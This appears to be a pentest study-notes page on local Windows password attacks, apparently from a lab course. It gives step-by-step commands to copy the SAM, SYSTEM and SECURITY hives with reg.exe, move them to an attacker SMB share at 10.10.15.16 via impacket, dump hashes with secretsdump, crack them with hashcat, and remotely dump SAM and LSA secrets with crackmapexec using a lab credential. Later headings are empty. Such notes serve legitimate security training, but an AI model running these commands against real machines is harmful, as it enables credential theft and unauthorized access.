# Local Windows Password Attacks

## SAM database

{% hint style="warning" %}
<mark style="color:red;">**For non-domain joined Windows system**</mark>
{% endhint %}

Here are our target registry hives:

* <mark style="color:red;">**hklm\sam :**</mark> Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
* <mark style="color:red;">**hklm\system :**</mark> Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
* <mark style="color:red;">**hklm\security :**</mark> Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

### Create backup of the hives (cmd launched as admin):

{% hint style="info" %}
Technically we will only need <mark style="color:green;">**hklm\sam**</mark> & <mark style="color:green;">**hklm\system**</mark>, but <mark style="color:green;">**hklm\security**</mark> can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts.
{% endhint %}

```powershell
C:\WINDOWS\system32 > reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32 > reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32 > reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

### Transfer the backup files to our attacking machine

#### Creating an SMB share (smbserver.py)

```bash
$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData <local-destination>
```

#### Moving the copies:

```powershell
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

### Dumping the hashes from hives (secretsdump.py)

```bash
$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Dumping local SAM hashes (uid:rid:lmhash:nthash)

```

### Cracking the dumped hashes

```bash
$ sudo hashcat -m 1000 NT-hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

{% hint style="success" %}
Done for the local part for now. This could be done remotely when we have local admin priv for a user. The remote command is below
{% endhint %}

```bash
$ crackmapexec smb <target-ip> --local-auth -u <user> -p <pass> --sam
```

### Remote Dumping and LSA secrets

{% hint style="danger" %}
Local admin privileges required
{% endhint %}

```bash
$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```



## LSASS service

## AD & NTDS.dit dictionnary

## Creds Hunting







